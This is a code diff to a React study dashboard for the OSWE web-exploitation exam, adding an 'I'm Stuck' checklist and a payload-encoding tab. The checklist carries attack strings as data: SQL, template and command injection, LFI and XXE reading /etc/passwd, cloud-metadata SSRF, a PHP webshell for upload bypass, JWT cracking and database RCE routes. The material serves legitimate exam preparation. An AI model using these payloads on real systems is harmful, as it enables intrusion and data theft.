@@ -251,6 +251,14 @@ const CSS=`
 .decision-btn{display:block;width:100%;padding:10px 14px;margin-bottom:6px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;color:var(--t0);font-family:var(--s);font-size:12px;font-weight:600;cursor:pointer;text-align:left;transition:all .15s}
 .decision-btn:hover{border-color:var(--ac);background:var(--acd)}
 .decision-btn.active{border-color:var(--ac);background:var(--acd);color:var(--ac)}
+.enc-in{width:100%;min-height:80px;background:var(--b0);border:1px solid var(--bd);border-radius:6px;padding:10px;color:var(--t0);font-family:var(--m);font-size:11px;line-height:1.6;resize:vertical;outline:none;margin-bottom:14px}
+.enc-in:focus{border-color:var(--ac)}
+.enc-out{background:var(--b2);border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin-bottom:8px}
+.enc-label{font-size:10px;font-weight:700;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.enc-val{font-family:var(--m);font-size:11px;color:var(--cg);word-break:break-all;white-space:pre-wrap;line-height:1.5}
+.stuck-card{background:var(--b2);border:1px solid var(--bd);border-radius:8px;padding:12px 14px;margin-bottom:8px}
+.stuck-q{font-size:13px;font-weight:700;color:var(--t0);margin-bottom:4px}
+.stuck-tip{font-size:11px;color:var(--t2);margin-bottom:6px}
 `;
 
 // ━━━ COMPONENTS ━━━
@@ -380,6 +388,68 @@ function TimerTab(){
   </div>)
 }
 
+// ━━━ TAB: I'M STUCK ━━━
+function StuckTab(){
+  const checks=[
+    { q: "Did you map ALL application routes?", cmd: "# Check routing files:\nfind . -name 'routes*' -o -name 'urls.py' -o -name 'web.php' -o -name 'app.js'\n# Check for hidden API endpoints in JS files:\ngrep -rn 'api\\|endpoint\\|fetch\\|axios' . --include='*.js' | grep -v node_modules", tip: "OSWE apps often have hidden admin endpoints or API routes not linked in the UI. Check ALL routing definitions.", critical: true },
+    { q: "Did you READ the source code carefully?", cmd: "# Check for dangerous patterns:\ngrep -rnE '(eval|exec|system|unserialize|pickle|readObject)' . --include='*.php' --include='*.java' --include='*.py' --include='*.js' --include='*.cs'\n# Check for SQL concatenation:\ngrep -rn 'SELECT.*+\\|INSERT.*+\\|UPDATE.*+' . --include='*.php' --include='*.java'", tip: "Don't just grep — READ the code flow from HTTP request to database query. Trace the data path manually.", critical: true },
+    { q: "Did you test ALL input fields for injection?", cmd: "# SQLi: ' OR 1=1--\n# SSTI: {{7*7}}\n# XSS: <script>alert(1)</script>\n# CMDi: ;id\n# LFI: ../../etc/passwd\n# Deserialization: Check cookies, hidden fields, headers", tip: "Test EVERY parameter: URL params, POST body, cookies, headers, JSON fields, file uploads.", critical: true },
+    { q: "Did you check authentication bypass vectors?", cmd: "# Type juggling: 0 == 'string' in PHP\n# Magic hashes: MD5('240610708') starts with 0e\n# Mass assignment: add role=admin to POST\n# IDOR: change user ID in URL\n# JWT: try alg=none, weak secret\nhashcat -m 16500 jwt.txt rockyou.txt", tip: "Auth bypass is 50% of the exam. Check: type juggling, JWT flaws, IDOR, default creds, SQL injection in login.", critical: true },
+    { q: "Did you check for deserialization vulnerabilities?", cmd: "# PHP: grep 'unserialize' . -rn\n# Java: grep 'readObject\\|ObjectInputStream' . -rn\n# .NET: grep 'BinaryFormatter\\|__VIEWSTATE' . -rn\n# Python: grep 'pickle.loads\\|yaml.load' . -rn\n# Node: grep 'serialize\\|unserialize' . -rn", tip: "Deserialization is a common OSWE RCE vector. Check cookies, session data, and any base64-encoded parameters." },
+    { q: "Did you check the database type and permissions?", cmd: "# PostgreSQL: COPY TO PROGRAM (superuser = RCE)\n# MySQL: INTO OUTFILE (FILE priv = webshell)\n# MSSQL: xp_cmdshell (sa = RCE)\n# SQLite: limited but can write files\n\n# Check DB config:\ngrep -ri 'password\\|dbname\\|host\\|port' config/ .env web.config", tip: "If you have SQLi, the DB type determines your RCE path. PostgreSQL superuser is the easiest to RCE.", critical: true },
+    { q: "Did you look for file upload bypass?", cmd: "# Extensions: .php5, .phtml, .phar, .pHp\n# Double ext: shell.php.jpg\n# Content-Type: change to image/jpeg\n# Magic bytes: GIF89a<?php system($_GET['c']); ?>\n# .htaccess upload: AddType application/x-httpd-php .jpg", tip: "If there's a file upload, try EVERY bypass technique. Check what validation the code actually does." },
+    { q: "Did you try SSRF / XXE?", cmd: "# XXE: <?xml version='1.0'?><!DOCTYPE d [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><d>&x;</d>\n# SSRF: http://127.0.0.1:8080, http://169.254.169.254/\n# Check any XML parsing, URL fetching, or webhook features", tip: "Any feature that processes XML or fetches URLs could be vulnerable." },
+    { q: "Did you check for race conditions?", cmd: "# Use Burp Turbo Intruder with race.py template\n# Or Python threading:\nimport threading\nthreads = [threading.Thread(target=exploit) for _ in range(20)]\nfor t in threads: t.start()", tip: "Coupon redemption, file upload validation, and balance transfers are classic race condition targets." },
+    { q: "Is your Python exploit script complete?", cmd: "# OSWE requires a SINGLE script:\n# python3 exploit.py <TARGET> <LHOST> <LPORT>\n# Must be NON-INTERACTIVE\n# Must chain: Auth Bypass → RCE\n# Test on clean machine before submitting!", tip: "Start writing the script EARLY. Don't wait until you've fully exploited manually — build it as you go.", critical: true },
+  ];
+  return(<div>
+    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>⚠️ RULE: If stuck {'>'} 1 hour on one vector, try a different approach.</div></div>
+    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, do it before trying anything else.</p>
+    {checks.map((c,i)=><div className="stuck-card" key={i}>
+      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
+        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
+        <div style={{flex:1}}>
+          <div className="stuck-q">{c.q}</div>
+          <div className="stuck-tip">{c.tip}</div>
+        </div>
+        <CopyBtn text={c.cmd}/>
+      </div>
+      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
+    </div>)}
+  </div>)
+}
+
+// ━━━ TAB: ENCODING ━━━
+function EncodingTab(){
+  const[input,setInput]=useState("");
+  const encodings=[
+    { label: "Base64", fn: s=>{ try{return btoa(unescape(encodeURIComponent(s)))}catch(e){return "[error]"} } },
+    { label: "Base64 Decode", fn: s=>{ try{return decodeURIComponent(escape(atob(s)))}catch(e){return "[invalid base64]"} } },
+    { label: "URL Encode", fn: s=>encodeURIComponent(s) },
+    { label: "Double URL Encode", fn: s=>encodeURIComponent(encodeURIComponent(s)) },
+    { label: "HTML Entities", fn: s=>s.split('').map(c=>c.charCodeAt(0)>127||'<>&"\''.includes(c)?`&#${c.charCodeAt(0)};`:c).join('') },
+    { label: "Hex (\\x)", fn: s=>s.split('').map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('') },
+    { label: "Unicode (\\u)", fn: s=>s.split('').map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('') },
+    { label: "Hex (0x, comma)", fn: s=>s.split('').map(c=>'0x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join(', ') },
+  ];
+  return(<div>
+    <div className="sec-title">Input</div>
+    <textarea className="enc-in" value={input} onChange={e=>setInput(e.target.value)} placeholder="Type or paste payload here..." spellCheck={false}/>
+    <div className="sec-title">Encoded Output</div>
+    {input&&encodings.map((enc,i)=>{
+      const result=enc.fn(input);
+      return(<div className="enc-out" key={i}>
+        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:4}}>
+          <div className="enc-label">{enc.label}</div>
+          <CopyBtn text={result}/>
+        </div>
+        <div className="enc-val">{result}</div>
+      </div>)
+    })}
+    {!input&&<p style={{fontSize:11,color:'var(--t2)'}}>Enter text above to see all encodings.</p>}
+  </div>)
+}
+
 function NotesTab(){
   const[notes,setNotes]=useState(()=>localStorage.getItem('oswe-notes-v2')||`# OSWE Exam Notes\n\n## Machine 1\nLanguage: \nDatabase: \nRouting: \nAuth Bypass: \nRCE Method: \nExploit Script: \nproof.txt (auth): \nproof.txt (rce): \n\n## Machine 2\nLanguage: \nDatabase: \nRouting: \nAuth Bypass: \nRCE Method: \nExploit Script: \nproof.txt (auth): \nproof.txt (rce): \n\n## Credentials Found\n\n## Key Code Snippets\n`);
   useEffect(()=>{localStorage.setItem('oswe-notes-v2',notes)},[notes]);
@@ -390,7 +460,7 @@ function NotesTab(){
 }
 
 // ━━━ MAIN APP ━━━
-const TABS=["🎯 Decision Engine","🔎 Grep-Fu","✅ Checklist","⏱ Timer","📝 Notes"];
+const TABS=["🎯 Decision Engine","🔎 Grep-Fu","🆘 I'm Stuck","🔀 Encoding","✅ Checklist","⏱ Timer","📝 Notes"];
 
 function App(){
   const[tab,setTab]=useState(0);
@@ -414,9 +484,11 @@ function App(){
       <div className="main">
         {tab===0&&<DecisionTab vals={vals}/>}
         {tab===1&&<QuickRefTab/>}
-        {tab===2&&<ChecklistTab/>}
-        {tab===3&&<TimerTab/>}
-        {tab===4&&<NotesTab/>}
+        {tab===2&&<StuckTab/>}
+        {tab===3&&<EncodingTab/>}
+        {tab===4&&<ChecklistTab/>}
+        {tab===5&&<TimerTab/>}
+        {tab===6&&<NotesTab/>}
       </div>
     </div>
   </>)
